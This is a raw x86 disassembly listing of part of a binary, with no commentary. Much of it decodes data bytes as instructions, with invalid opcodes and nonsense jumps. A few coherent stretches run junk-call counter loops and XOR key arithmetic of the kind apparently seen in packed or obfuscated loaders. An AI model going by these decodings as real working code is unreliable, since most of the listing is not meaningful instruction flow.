  404a4c:	loopne 0x404a8c
  404a4e:	aaa    
  404a4f:	imul   edx,DWORD PTR [ebp+edx*1+0x5e413a31],0xe9b2a85
  404a5a:	pop    sp
  404a5c:	test   BYTE PTR [edi],dh
  404a5e:	out    0xd8,al
  404a60:	adc    al,0xe2
  404a62:	pop    esp
  404a63:	rcr    DWORD PTR [ebp-0x505e1100],0x18
  404a6a:	mov    WORD PTR [ebx+0x18],gs
  404a6d:	push   ecx
  404a6e:	icebp  
  404a6f:	cmp    eax,0x6655ca8d
  404a74:	(bad)  
  404a75:	cmp    esi,edx
  404a77:	lods   al,BYTE PTR ds:[esi]
  404a78:	in     al,0x3f
  404a7a:	mov    gs,WORD PTR [ecx]
  404a7c:	pop    esp
  404a7d:	jns    0x404aeb
  404a7f:	or     eax,0x7e0bc86e
  404a84:	dec    eax
  404a85:	pop    esp
  404a86:	test   eax,0x4b3a8c38
  404a8b:	push   esp
  404a8c:	jbe    0x404acf
  404a8e:	sub    BYTE PTR [ecx-0x2d6ab1d0],dh
  404a94:	loope  0x404ae5
  404a96:	push   esp
  404a97:	cmp    ch,ah
  404a99:	fbld   TBYTE PTR [ecx]
  404a9b:	xor    ch,BYTE PTR [eax+0x2c]
  404a9e:	(bad)  
  404a9f:	push   edi
  404aa0:	mov    ecx,0xbf7cbdc2
  404aa5:	adc    eax,0xb4be6c86
  404aaa:	mov    edx,0x171b9db2
  404aaf:	xor    al,0x3
  404ab1:	repz popf 
  404ab3:	mov    DWORD PTR [ebx],eax
  404ab5:	sub    ecx,esi
  404ab7:	(bad)  
  404ab8:	loopne 0x404b30
  404aba:	jae    0x404ac4
  404abc:	push   ebx
  404abd:	leave  
  404abe:	lods   al,BYTE PTR ds:[esi]
  404abf:	mov    cs,ecx
  404ac1:	fldcw  WORD PTR [eax-0x217b4959]
  404ac7:	stos   DWORD PTR es:[edi],eax
  404ac8:	imul   ebx,eax,0x628b462d
  404ace:	push   esp
  404acf:	je     0x404aa8
  404ad1:	in     al,dx
  404ad2:	mov    ebp,0x5d4b8882
  404ad7:	in     al,dx
  404ad8:	jp     0x404a6d
  404ada:	xchg   edx,eax
  404adb:	add    ch,dl
  404add:	cs lahf 
  404adf:	add    BYTE PTR [edi],cl
  404ae1:	jno    0x404b3d
  404ae3:	scas   eax,DWORD PTR es:[edi]
  404ae4:	loope  0x404abc
  404ae6:	stos   BYTE PTR es:[edi],al
  404ae7:	ret    
  404ae8:	push   ebp
  404ae9:	ds es ds popf 
  404aed:	inc    ebx
  404aee:	pop    edi
  404aef:	jne    0x404b41
  404af1:	lock or edx,ebx
  404af4:	(bad)  
  404af5:	and    DWORD PTR [esi],esi
  404af7:	xchg   ebx,eax
  404af8:	push   cs
  404af9:	jmp    0xefb0:0xccc70015
  404b00:	scas   al,BYTE PTR es:[edi]
  404b01:	out    0x3e,al
  404b03:	sbb    BYTE PTR [edx+edi*8+0xa47fde0],ah
  404b0a:	jge    0x404a94
  404b0c:	lahf   
  404b0d:	mov    eax,0x289f3a3
  404b12:	push   ss
  404b13:	loope  0x404b21
  404b15:	or     dh,BYTE PTR [edi+ebx*2]
  404b18:	xchg   ecx,eax
  404b19:	test   BYTE PTR [edi-0x525eca1c],al
  404b1f:	xchg   edx,eax
  404b20:	aam    0xda
  404b22:	sahf   
  404b23:	cmp    eax,0xdd5217f
  404b28:	imul   esi,DWORD PTR [edx-0x9],0xffffffe8
  404b2c:	dec    esi
  404b2d:	mov    cl,0x3a
  404b2f:	and    edi,esp
  404b31:	fld    QWORD PTR [edx-0x5a]
  404b34:	in     al,dx
  404b35:	adc    edx,DWORD PTR [edx-0x20601183]
  404b3b:	jle    0x404b77
  404b3d:	sahf   
  404b3e:	fwait
  404b3f:	lods   al,BYTE PTR ds:[esi]
  404b40:	cmp    BYTE PTR [eax],bh
  404b42:	adc    cl,al
  404b44:	cmp    DWORD PTR [eax],edx
  404b46:	xchg   esi,eax
  404b47:	pop    edi
  404b48:	push   ebx
  404b49:	call   edi
  404b4b:	pop    eax
  404b4c:	repnz push ss
  404b4e:	sub    edx,DWORD PTR [ebx-0x16b9a7a4]
  404b54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b55:	sub    dl,BYTE PTR [ecx+0x0]
  404b58:	dec    ebx
  404b59:	xor    ebp,edi
  404b5b:	fistp  WORD PTR [edi+0x38e98463]
  404b61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b62:	shl    ch,cl
  404b64:	nop
  404b65:	pusha  
  404b66:	dec    esp
  404b67:	pop    esi
  404b68:	and    DWORD PTR [edi-0x1d437903],ebp
  404b6e:	jae    0x404b30
  404b70:	cmp    DWORD PTR [esi],esi
  404b72:	inc    ebx
  404b73:	mov    edx,ecx
  404b75:	jmp    0x404b2e
  404b77:	js     0x404b86
  404b79:	das    
  404b7a:	sub    al,0xfe
  404b7c:	jge    0x404b0f
  404b7e:	pop    ebx
  404b7f:	std    
  404b80:	jmp    0x404b72
  404b82:	push   ebp
  404b83:	inc    esi
  404b84:	popf   
  404b85:	dec    ebp
  404b86:	icebp  
  404b87:	(bad)  
  404b88:	pop    ss
  404b89:	jmp    0xaddc:0x9bc9ddad
  404b90:	or     edi,DWORD PTR ds:0x264ec67e
  404b96:	cmp    BYTE PTR [ecx+0x2e3684e7],ch
  404b9c:	in     eax,0x95
  404b9e:	and    al,0xd6
  404ba0:	scas   eax,DWORD PTR es:[edi]
  404ba1:	sbb    DWORD PTR [eax+0x43],ebx
  404ba4:	loopne 0x404c25
  404ba6:	out    dx,eax
  404ba7:	retf   
  404ba8:	leave  
  404ba9:	addr16 clc 
  404bab:	cli    
  404bac:	(bad)  
  404bae:	ds aam 0xfa
  404bb1:	dec    ecx
  404bb2:	pop    edi
  404bb3:	(bad)  
  404bb4:	out    dx,al
  404bb5:	pop    ebp
  404bb6:	loope  0x404b69
  404bb8:	gs inc edi
  404bba:	inc    esp
  404bbb:	mov    al,0x9a
  404bbd:	sub    BYTE PTR [ecx+0x34aa4b42],bl
  404bc3:	das    
  404bc4:	iret   
  404bc5:	sti    
  404bc6:	jne    0x404bc7
  404bc8:	pop    esp
  404bc9:	mov    edi,0x9d6c46bb
  404bce:	fwait
  404bcf:	jle    0x404bb0
  404bd1:	and    dl,al
  404bd3:	sbb    eax,DWORD PTR [ebx-0x66]
  404bd6:	push   0x7b529a53
  404bdb:	mov    ebp,DWORD PTR [esi+0x6b]
  404bde:	xor    eax,DWORD PTR [edi-0x2b]
  404be1:	jnp    0x404b6e
  404be3:	cmp    BYTE PTR [bx+si+0x4770],cl
  404be8:	mov    edx,0x61f8868f
  404bed:	dec    ebp
  404bee:	xlat   BYTE PTR ds:[ebx]
  404bef:	push   esi
  404bf0:	dec    ecx
  404bf1:	jns    0x404c61
  404bf3:	stos   BYTE PTR es:[edi],al
  404bf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bf5:	pop    ds
  404bf6:	xchg   ebp,eax
  404bf7:	icebp  
  404bf8:	pop    esi
  404bf9:	fild   QWORD PTR [esi+0x3074b6c7]
  404bff:	fisttp WORD PTR [ebp+0x29]
  404c02:	out    0xbe,al
  404c04:	pop    esp
  404c05:	push   ebp
  404c06:	je     0x404c48
  404c08:	add    DWORD PTR [ebp-0x6aea19c5],0x22
  404c0f:	arpl   WORD PTR [edi+0x27],si
  404c12:	cmp    al,0x5d
  404c14:	cmp    bh,BYTE PTR [esi+0x61]
  404c17:	fwait
  404c18:	(bad)  
  404c19:	jl     0x404c60
  404c1b:	pusha  
  404c1c:	in     al,dx
  404c1d:	pop    eax
  404c1e:	jmp    0x5a156559
  404c23:	mov    eax,0xc1e2a57b
  404c28:	sbb    eax,0x5b3d1a94
  404c2d:	test   al,0x83
  404c2f:	dec    eax
  404c30:	lea    edi,[edx]
  404c32:	push   DWORD PTR [ecx+0x37]
  404c35:	retf   0xfd07
  404c38:	mov    ah,0x3a
  404c3a:	test   DWORD PTR [ebx],esp
  404c3c:	je     0x404bdc
  404c3e:	and    DWORD PTR [esi+edx*2],esp
  404c41:	push   esi
  404c42:	scas   eax,DWORD PTR es:[edi]
  404c43:	jb     0x404c55
  404c45:	mov    cl,0x28
  404c47:	gs mov esi,0x96fab80d
  404c4d:	xchg   edx,eax
  404c4e:	clc    
  404c4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c50:	mov    DWORD PTR [eax+esi*2-0x632bdbce],ecx
  404c57:	(bad)  [eax]
  404c59:	out    dx,eax
  404c5a:	scas   al,BYTE PTR es:[edi]
  404c5b:	mov    al,ds:0xbe8caa11
  404c60:	pop    esi
  404c61:	cdq    
  404c62:	out    dx,al
  404c63:	push   ebx
  404c64:	out    0x6f,eax
  404c66:	adc    al,BYTE PTR [edi-0x57]
  404c69:	outs   dx,BYTE PTR ds:[esi]
  404c6a:	sbb    eax,0x7edc2e06
  404c6f:	xchg   ebp,eax
  404c70:	pop    es
  404c71:	or     ebp,DWORD PTR [ebp+0x71]
  404c74:	add    BYTE PTR [esp+ebx*1-0x3746ed8c],0x8b
  404c7c:	dec    ebp
  404c7d:	xor    dh,BYTE PTR [ecx-0x6e]
  404c80:	les    edi,FWORD PTR [esi]
  404c82:	inc    esp
  404c83:	xor    ch,BYTE PTR [ebp+0x2d]
  404c86:	call   0x28fb5f92
  404c8b:	jne    0x404c61
  404c8d:	inc    esi
  404c8e:	jge    0x404c3c
  404c90:	stos   DWORD PTR es:[edi],eax
  404c91:	jge    0x404d00
  404c93:	pusha  
  404c94:	adc    bl,cl
  404c96:	dec    edx
  404c97:	inc    edx
  404c98:	xchg   ecx,eax
  404c99:	ret    
  404c9a:	xlat   BYTE PTR ds:[ebx]
  404c9b:	mov    esp,DWORD PTR [eax+0x20]
  404c9e:	outs   dx,DWORD PTR ds:[esi]
  404c9f:	fcmovbe st,st(1)
  404ca1:	clc    
  404ca2:	sbb    DWORD PTR [edi],esi
  404ca4:	(bad)  
  404ca6:	mov    bl,0xe2
  404ca8:	or     al,0xcd
  404caa:	dec    esi
  404cab:	sub    al,0x13
  404cad:	sahf   
  404cae:	adc    esp,edi
  404cb0:	sub    ch,al
  404cb2:	cli    
  404cb3:	sbb    edi,edi
  404cb5:	adc    eax,DWORD PTR [ebx-0x5f968146]
  404cbb:	lahf   
  404cbc:	jbe    0x404ca2
  404cbe:	sar    DWORD PTR [eax],cl
  404cc0:	hlt    
  404cc1:	enter  0xb4d9,0x3e
  404cc5:	js     0x404cf0
  404cc7:	fs popf 
  404cc9:	xor    DWORD PTR [esi],ebx
  404ccb:	in     eax,0x3c
  404ccd:	dec    esp
  404cce:	js     0x404cda
  404cd0:	dec    edx
  404cd1:	pushf  
  404cd2:	add    BYTE PTR [edx+0x22],dh
  404cd5:	adc    edx,esi
  404cd7:	dec    esp
  404cd8:	xchg   ecx,eax
  404cd9:	inc    eax
  404cda:	out    0x2d,al
  404cdc:	inc    ebx
  404cdd:	mov    ebx,eax
  404cdf:	daa    
  404ce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ce1:	in     eax,dx
  404ce2:	jnp    0x404c8e
  404ce4:	jnp    0x404cd0
  404ce6:	js     0x404d36
  404ce8:	fucom  st(1)
  404cea:	or     ebx,DWORD PTR [esi+0x3c9d060d]
  404cf0:	mov    edi,0x390ccc97
  404cf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cf6:	hlt    
  404cf7:	xlat   BYTE PTR ds:[ebx]
  404cf8:	xor    DWORD PTR [ebx],ebp
  404cfa:	xchg   ebp,eax
  404cfb:	je     0x404d07
  404cfd:	mov    eax,DWORD PTR [ebp-0x14]
  404d00:	add    DWORD PTR [eax],0x705fa8c
  404d06:	mov    eax,DWORD PTR [ebp-0x10]
  404d09:	mov    edx,DWORD PTR [ebp+0x8]
  404d0c:	xor    eax,ecx
  404d0e:	lea    eax,[eax+edx*1+0x327299]
  404d15:	mov    DWORD PTR [ebp+0x8],eax
  404d18:	inc    DWORD PTR [ebp+0xc]
  404d1b:	jmp    0x4040d8
  404d20:	mov    eax,DWORD PTR [ebp-0x10]
  404d23:	xor    eax,ecx
  404d25:	mov    ecx,DWORD PTR [ebp+0x10]
  404d28:	add    eax,esi
  404d2a:	mov    DWORD PTR [ecx],eax
  404d2c:	pop    esi
  404d2d:	leave  
  404d2e:	ret    0xc
  404d31:	push   ebp
  404d32:	mov    ebp,esp
  404d34:	push   ecx
  404d35:	sub    edx,eax
  404d37:	jmp    0x404f34
  404d3c:	pop    edi
  404d3d:	mov    ebx,cs
  404d3f:	and    ebp,edi
  404d41:	jno    0x404dc0
  404d43:	dec    esp
  404d44:	call   0x52aa7d7b
  404d49:	and    esp,edi
  404d4b:	inc    esp
  404d4c:	sbb    ebp,DWORD PTR [edi]
  404d4e:	jle    0x404dce
  404d50:	pop    esi
  404d51:	jg     0x404dd1
  404d53:	jle    0x404d8b
  404d55:	into   
  404d56:	sar    DWORD PTR [ecx-0x1d9f6546],0xcc
  404d5d:	lods   al,BYTE PTR ds:[esi]
  404d5e:	push   es
  404d5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d60:	sub    DWORD PTR [edi+0x21],esi
  404d63:	mov    ds,WORD PTR [edi]
  404d65:	mov    BYTE PTR [esi+edi*1-0x757e4ec8],ch
  404d6c:	jg     0x404d92
  404d6e:	out    dx,al
  404d6f:	gs adc eax,0x1cefe8b7
  404d75:	repnz xor ebx,DWORD PTR [eax-0x56]
  404d79:	push   0xffffffdd
  404d7b:	jne    0x404d16
  404d7d:	(bad)  
  404d7e:	push   edi
  404d7f:	dec    DWORD PTR [esi-0x67]
  404d82:	dec    edx
  404d83:	push   edi
  404d84:	nop
  404d85:	into   
  404d86:	add    BYTE PTR [ebx],dh
  404d88:	xor    al,0xbe
  404d8a:	mov    edi,0xbce7f4a6
  404d8f:	cmp    al,0x3f
  404d91:	cs dec eax
  404d93:	mov    eax,ds:0x1cd79b7b
  404d98:	mov    ?,edx
  404d9a:	xchg   dl,ah
  404d9c:	repz ror bl,cl
  404d9f:	aam    0x79
  404da1:	mov    DWORD PTR [eax-0x515c9878],edi
  404da7:	or     cl,BYTE PTR [ecx+0x7e9b6763]
  404dad:	add    DWORD PTR [ecx+0x282c8efa],eax
  404db3:	jmp    0x6047:0x7c344ccf
  404dba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dbb:	int    0x11
  404dbd:	aas    
  404dbe:	cmp    al,0xc7
  404dc0:	ds xchg ecx,eax
  404dc2:	lods   al,BYTE PTR ds:[esi]
  404dc3:	push   ss
  404dc4:	ret    0xb795
  404dc7:	outs   dx,DWORD PTR ds:[esi]
  404dc8:	fnsave [ecx]
  404dca:	inc    edi
  404dcb:	xchg   edi,eax
  404dcc:	pop    esi
  404dcd:	jae    0x404d6d
  404dcf:	sub    dl,BYTE PTR [edi+ebp*4]
  404dd2:	retf   0x5f08
  404dd5:	mov    cl,bl
  404dd7:	pop    edx
  404dd8:	add    edi,esi
  404dda:	inc    edx
  404ddb:	fist   DWORD PTR [ebp+0x3d]
  404dde:	sub    esi,DWORD PTR [eax-0x613d5e2a]
  404de4:	scas   al,BYTE PTR es:[edi]
  404de5:	mov    ds:0x8008b33f,eax
  404dea:	sub    edi,DWORD PTR [esi]
  404dec:	test   eax,0x6f7f9ac
  404df1:	push   es
  404df2:	in     eax,0xad
  404df4:	ds push 0x1d1ff784
  404dfa:	add    cl,dl
  404dfc:	ret    0x7d22
  404dff:	sti    
  404e00:	stos   BYTE PTR es:[edi],al
  404e01:	stos   BYTE PTR es:[edi],al
  404e02:	loopne 0x404e17
  404e04:	xchg   BYTE PTR [eax-0x14],bl
  404e07:	(bad)  
  404e09:	mov    ebx,0x895c4656
  404e0e:	mov    ds,ecx
  404e10:	cmc    
  404e11:	fst    QWORD PTR ds:0xca3fefbd
  404e17:	xchg   esp,eax
  404e18:	(bad)  
  404e19:	dec    esp
  404e1a:	sbb    eax,0xad227d15
  404e1f:	popf   
  404e20:	aam    0x37
  404e22:	fistp  QWORD PTR [edx]
  404e24:	push   ebp
  404e25:	std    
  404e26:	aaa    
  404e27:	push   ss
  404e28:	sar    DWORD PTR [ebx-0x56e76f75],1
  404e2e:	daa    
  404e2f:	push   esi
  404e30:	out    dx,eax
  404e31:	pop    ecx
  404e32:	rol    BYTE PTR [esp+ebx*4+0x3b355825],0xa7
  404e3a:	sbb    dl,BYTE PTR [eax]
  404e3c:	pop    edi
  404e3d:	push   ebp
  404e3e:	ret    
  404e3f:	mov    dh,0x48
  404e41:	loope  0x404dcc
  404e43:	mov    edx,0x54b9fc73
  404e48:	xor    cl,BYTE PTR ds:0x557b5ddf
  404e4e:	pop    ebx
  404e4f:	dec    ebp
  404e50:	xchg   esi,eax
  404e51:	xchg   esp,eax
  404e52:	pushf  
  404e53:	fist   WORD PTR [ebp-0x26]
  404e56:	jb     0x404dde
  404e58:	adc    dh,BYTE PTR [eax]
  404e5a:	jno    0x404ec7
  404e5c:	dec    DWORD PTR [edx]
  404e5e:	pop    ebp
  404e5f:	pop    ecx
  404e60:	lea    ebx,[eax]
  404e62:	or     DWORD PTR [ebx+0x5045a903],ebx
  404e68:	inc    esi
  404e69:	pop    es
  404e6a:	fcomip st,st(3)
  404e6c:	mov    bl,ah
  404e6e:	mov    dl,0x2b
  404e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e71:	pop    ebx
  404e72:	mov    eax,ds:0x191bfb97
  404e77:	inc    ebx
  404e78:	data16 jle 0x404e33
  404e7b:	loope  0x404dff
  404e7d:	aad    0xdc
  404e7f:	mov    eax,ds:0xe77d917b
  404e84:	call   0xaf15d9b2
  404e89:	push   ds
  404e8a:	popa   
  404e8b:	sbb    ch,BYTE PTR [edx-0x4e]
  404e8e:	jne    0x404e16
  404e90:	lock test al,0x68
  404e93:	cdq    
  404e94:	xchg   ebp,eax
  404e95:	ret    0x8476
  404e98:	jmp    0x118:0xdc86125a
  404e9f:	pop    ecx
  404ea0:	mov    eax,ds:0xf6026100
  404ea5:	std    
  404ea6:	std    
  404ea7:	fild   QWORD PTR [edi-0x543d7ab9]
  404ead:	or     DWORD PTR [eax+0x74ce2311],ebp
  404eb3:	fcom   QWORD PTR [esi+0xb]
  404eb6:	and    dh,ch
  404eb8:	xor    dl,ch
  404eba:	test   ch,ah
  404ebc:	hlt    
  404ebd:	mov    edi,0x26ac6b96
  404ec2:	adc    eax,0x48737884
  404ec7:	outs   dx,DWORD PTR ds:[esi]
  404ec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ec9:	xchg   ebx,esi
  404ecb:	mov    dl,0x71
  404ecd:	push   0xfffffffa
  404ecf:	push   ebp
  404ed0:	fisttp QWORD PTR [esp+ebp*4+0x7a]
  404ed4:	mov    al,ds:0x9a86037d
  404ed9:	xchg   edx,eax
  404eda:	adc    eax,0xe3f8e917
  404edf:	scas   al,BYTE PTR es:[edi]
  404ee0:	xchg   edi,eax
  404ee1:	sub    eax,0xff935322
  404ee6:	(bad)  
  404ee7:	test   al,0x40
  404ee9:	mov    eax,0x2f9b013e
  404eee:	add    ch,bh
  404ef0:	aad    0x36
  404ef2:	std    
  404ef3:	fwait
  404ef4:	push   0x12cf58f1
  404ef9:	aaa    
  404efa:	add    al,0x1e
  404efc:	inc    esi
  404efd:	dec    DWORD PTR [eax+esi*8-0x5d8208ea]
  404f04:	data16 (bad) 
  404f06:	adc    al,0x8b
  404f08:	icebp  
  404f09:	mov    bh,0xe2
  404f0b:	popf   
  404f0c:	add    BYTE PTR [ecx-0x7d],ch
  404f0f:	xlat   BYTE PTR ds:[ebx]
  404f10:	gs int 0x1e
  404f13:	test   al,0x66
  404f15:	enter  0xf2e9,0x61
  404f19:	jp     0x404f3d
  404f1b:	xor    al,0xc6
  404f1d:	mov    ?,WORD PTR [eax+0x506465f1]
  404f23:	neg    BYTE PTR [eax]
  404f25:	cld    
  404f26:	les    edx,FWORD PTR [esp+eax*8-0x1bfde155]
  404f2d:	rcr    DWORD PTR [esi],0x4a
  404f30:	mov    esp,0x51897ab1
  404f35:	or     edx,DWORD PTR ds:0x4344fb
  404f3b:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  404f42:	mov    DWORD PTR ds:0x43458b,0x1c
  404f4c:	cmp    DWORD PTR ds:0x43458b,0x0
  404f53:	je     0x404f94
  404f59:	cmp    DWORD PTR ds:0x43458b,0x21
  404f60:	jne    0x404f84
  404f66:	push   DWORD PTR [ebp-0x24]
  404f69:	push   DWORD PTR [ebp-0x20]
  404f6c:	push   0x26f9
  404f71:	push   0x3d74
  404f76:	push   0x4b4e
  404f7b:	push   DWORD PTR [ebp-0x1c]
  404f7e:	call   DWORD PTR ds:0x413280
  404f84:	mov    eax,ds:0x43458b
  404f89:	dec    eax
  404f8a:	mov    ds:0x43458b,eax
  404f8f:	jmp    0x404f4c
  404f94:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404f9b:	mov    eax,DWORD PTR [ebp-0x4]
  404f9e:	xor    DWORD PTR ds:0x4344f3,ecx
  404fa4:	push   esi
  404fa5:	and    DWORD PTR ds:0x434593,0x0
  404faf:	mov    edx,DWORD PTR ds:0x434593
  404fb5:	inc    edx
  404fb6:	mov    DWORD PTR ds:0x434593,edx
  404fbc:	cmp    DWORD PTR ds:0x434593,0x21
  404fc3:	jne    0x404fe1
  404fc9:	push   0x434749
  404fce:	push   0x4346ce
  404fd3:	push   0x6321
  404fd8:	push   DWORD PTR [ebp-0x10]
  404fdb:	call   DWORD PTR ds:0x4130bc
  404fe1:	cmp    DWORD PTR ds:0x434593,0x19
  404fe8:	jb     0x404faf
  404fee:	inc    ecx
  404fef:	mov    esi,DWORD PTR [ebp-0x8]
  404ff2:	inc    DWORD PTR ds:0x434537
  404ff8:	mov    edx,0x7510851
  404ffd:	xor    eax,edx
  404fff:	xor    esi,edx
  405001:	mov    ecx,0x327299
  405006:	add    esi,ecx
  405008:	xor    DWORD PTR ds:0x434537,0x55d1
  405012:	add    eax,ecx
  405014:	imul   eax,esi
  405017:	mov    esi,DWORD PTR [ebp+0xc]
  40501a:	cmp    esi,eax
  40501c:	jne    0x405038
  405022:	mov    eax,DWORD PTR [ebp-0x4]
  405025:	mov    esi,DWORD PTR [ebp-0x8]
  405028:	xor    eax,edx
  40502a:	xor    esi,edx
  40502c:	add    eax,ecx
  40502e:	add    esi,ecx
  405030:	imul   eax,esi
  405033:	jmp    0x405270
  405038:	mov    eax,DWORD PTR [ebp+0xc]
  40503b:	mov    eax,DWORD PTR [eax+0x78]
  40503e:	jmp    0x40523b
  405043:	imul   esp,DWORD PTR [eax],0x7d571dbe
  405049:	jge    0x4050b7
  40504b:	push   esp
  40504c:	pop    ds
  40504d:	loopne 0x40508f
  40504f:	dec    ebp
  405050:	aaa    
  405051:	push   ebx
  405052:	std    
  405053:	jnp    0x40507e
  405055:	jle    0x4050d5
  405057:	pop    esi
  405058:	jg     0x4050d8
  40505a:	jle    0x4050c7
  40505c:	push   ecx
  40505d:	test   al,0xa
  40505f:	out    0x6f,eax
  405061:	loope  0x40504e
  405063:	pop    edi
  405064:	mov    al,0xd9
  405066:	outs   dx,BYTE PTR ds:[esi]
  405067:	jnp    0x405057
  405069:	cmp    edx,DWORD PTR [edx]
  40506b:	push   ebx
  40506c:	jne    0x405087
  40506e:	sub    esi,ebx
  405070:	jae    0x404ffd
  405072:	inc    edx
  405073:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405074:	sbb    al,ch
  405076:	out    dx,al
  405077:	mov    ecx,0xa3c0b8c
  40507c:	push   0xffffffb4
  40507e:	cmp    edi,esi
  405080:	jle    0x405008
  405082:	lods   eax,DWORD PTR ds:[esi]
  405083:	xchg   ebx,eax
  405084:	mov    ah,BYTE PTR [esi+0x43]
  405087:	fisttp DWORD PTR [ecx+0x2da52166]
  40508d:	test   DWORD PTR [ebp+0x7d],edx
  405090:	jbe    0x405034
  405092:	add    bh,cl
  405094:	push   cs
  405095:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405097:	mov    ds,edx
  405099:	pop    ebp
  40509a:	xchg   BYTE PTR [eax+ebx*1],dl
  40509d:	sti    
  40509e:	mov    al,0x8
  4050a0:	or     BYTE PTR [edi-0x7f4e946e],0x80
  4050a7:	xchg   ebx,eax
  4050a8:	cs mov dh,0x8d
  4050ab:	iret   
  4050ac:	inc    eax
  4050ad:	xchg   DWORD PTR [edi],edx
  4050af:	mov    ah,0x80
  4050b1:	arpl   di,bp
  4050b3:	inc    eax
  4050b4:	jae    0x4050e6
  4050b6:	fst    st(4)
  4050b8:	leave  
  4050b9:	dec    esi
  4050ba:	xchg   ebp,eax
  4050bb:	fst    QWORD PTR [ebx+0x3f79de5a]
  4050c1:	or     al,BYTE PTR ds:0x5bdecf69
  4050c7:	cmp    eax,0x9f1161a8
  4050cc:	xor    al,0xec
  4050ce:	int3   
  4050cf:	pop    ebx
  4050d0:	xor    ch,bh
  4050d2:	loop   0x4050ba
  4050d4:	inc    ebx
  4050d5:	ja     0x405121
  4050d7:	jmp    FWORD PTR [eax+0x2aaa19d]
  4050dd:	dec    ebp
  4050de:	mov    edx,0xa751b918
  4050e3:	sbb    edx,edi
  4050e5:	sub    al,0x64
  4050e7:	gs sub esp,edx
  4050ea:	xchg   DWORD PTR [ecx+0x4c],eax
  4050ed:	add    al,0x9e
  4050ef:	jl     0x405080
  4050f1:	mov    ebp,DWORD PTR [edx]
  4050f3:	sub    eax,0xd3eb91c0
  4050f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050f9:	dec    edi
  4050fa:	das    
  4050fb:	cmp    edx,DWORD PTR [eax+0x5d]
  4050fe:	push   0xffffff93
  405100:	imul   ebp,DWORD PTR [ebx+0x3d],0xffffffee
  405104:	(bad)  
  405105:	scas   al,BYTE PTR es:[edi]
  405106:	sbb    ebp,DWORD PTR [ebp+eiz*8+0x6b]
  40510a:	ds stos DWORD PTR es:[edi],eax
  40510c:	or     eax,0x5912d23b
  405111:	aad    0x52
  405113:	dec    ecx
  405114:	or     eax,0x2b64f2ae
  405119:	imul   BYTE PTR [ebp+0x63]
  40511c:	push   ds
  40511d:	adc    eax,0x19ac1bea
  405122:	jb     0x40515f
  405124:	loop   0x405146
  405126:	das    
  405127:	je     0x40512f
  405129:	push   ecx
  40512a:	test   ecx,0xf4e6b1da
  405130:	dec    edx
  405131:	jg     0x4050e2
  405133:	rcl    DWORD PTR [ebp+0x5d],0xa8
  405137:	mov    dh,0xcc
  405139:	(bad)  
  40513a:	repnz mov dl,BYTE PTR [edx]
  40513d:	repnz sahf 
  40513f:	jmp    0xb61bc4d7
  405144:	hlt    
  405145:	mov    bl,0xd5
  405147:	fisttp WORD PTR [edi+0x47aabe03]
  40514d:	push   esi
  40514e:	inc    esi
  40514f:	clc    
  405150:	jnp    0x405188
  405152:	jl     0x4051ac
  405154:	adc    BYTE PTR [ecx-0x412004d8],0x17
  40515b:	test   eax,0xe4428f15
  405160:	leave  
  405161:	je     0x40514b
  405163:	sbb    al,0x42
  405165:	xor    ah,dh
  405167:	mov    al,ds:0x4bf253fb
  40516c:	sub    cl,cl
  40516e:	push   edi
  40516f:	dec    ebx
  405170:	int3   
  405171:	push   ebx
  405172:	lock adc eax,0x3a73f2d8
  405178:	sbb    al,cl
  40517a:	push   ebx
  40517b:	lahf   
  40517c:	push   esi
  40517d:	aam    0xd
  40517f:	adc    BYTE PTR [eax],ch
  405181:	lea    ebx,[ebx+0xc]
  405184:	addr16 das 
  405186:	pop    esi
  405187:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405188:	mov    dl,0x11
  40518a:	sbb    eax,0x8cf91005
  40518f:	mov    edx,0x81c748cd
  405194:	mov    esp,0xb82594d4
  405199:	jae    0x40520a
  40519b:	ins    DWORD PTR es:[edi],dx
  40519c:	jnp    0x405128
  40519e:	ja     0x4051ec
  4051a0:	mov    BYTE PTR [eax+ecx*4-0x40e35ab8],ah
  4051a7:	scas   eax,DWORD PTR es:[edi]
  4051a8:	pop    ds
  4051a9:	inc    edx
  4051aa:	fiadd  DWORD PTR [ecx+0x4]
  4051ad:	call   0xe5487bbf
  4051b2:	or     BYTE PTR [ecx-0x4d],dh
  4051b5:	cli    
  4051b6:	test   al,0xf6
  4051b8:	sub    al,0xd7
  4051ba:	out    0x52,eax
  4051bc:	or     BYTE PTR [esi+0x7b],0xe5
  4051c0:	retf   0x690
  4051c3:	ret    0xa87f
  4051c6:	loopne 0x4051a4
  4051c8:	jmp    0xf665deb
  4051cd:	jb     0x40523e
  4051cf:	out    0xd4,al
  4051d1:	add    BYTE PTR [eax],0x2d
  4051d4:	imul   DWORD PTR [esi]
  4051d6:	es push cs
  4051d8:	jecxz  0x4051e1
  4051da:	lods   eax,DWORD PTR ds:[esi]
  4051db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051dc:	mov    eax,0x44f04639
  4051e1:	les    ebx,FWORD PTR [ecx-0x3b]
  4051e4:	jecxz  0x4051b2
  4051e6:	sub    DWORD PTR [ebx],0xd920ca27
  4051ec:	push   es
  4051ed:	adc    DWORD PTR [esi],eax
  4051ef:	ja     0x405202
  4051f1:	and    BYTE PTR [edi+0x75],bh
  4051f4:	ret    
  4051f5:	mov    cl,0x11
  4051f7:	mov    eax,0x985224e8
  4051fc:	jnp    0x40527d
  4051fe:	rcr    DWORD PTR [ebp-0xb],cl
  405201:	mov    DWORD PTR [eax-0x7f],eax
  405204:	xchg   DWORD PTR ds:[edi],esi
  405207:	mov    esi,0x1ef96ccf
  40520c:	push   esp
  40520d:	add    edi,ecx
  40520f:	retf   
